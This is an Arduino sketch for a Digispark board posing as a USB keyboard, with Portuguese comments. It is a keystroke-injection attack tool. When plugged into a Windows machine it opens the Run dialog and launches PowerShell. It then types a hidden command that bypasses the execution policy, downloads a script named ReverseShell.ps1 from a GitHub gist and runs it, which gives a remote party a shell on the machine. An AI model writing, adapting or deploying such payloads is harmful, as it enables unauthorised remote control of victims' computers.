#include "DigiKeyboardPtBr.h"
void setup() {
  pinMode(0,OUTPUT); 
  pinMode(1,OUTPUT);     
}

void loop() {  
  pisca_led(100);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println('powershell');
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(5000); 
  // Executando o script publicado no gist
  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/brunomlima/ae0b7c7a898cfd8628d79c080dda32ba/raw/133edad599864a188858e5ccbf2c644195f0b894/ReverseShell.ps1');\""));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
  pisca_led(1000); 
  for(;;){ /*empty*/ }  
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}
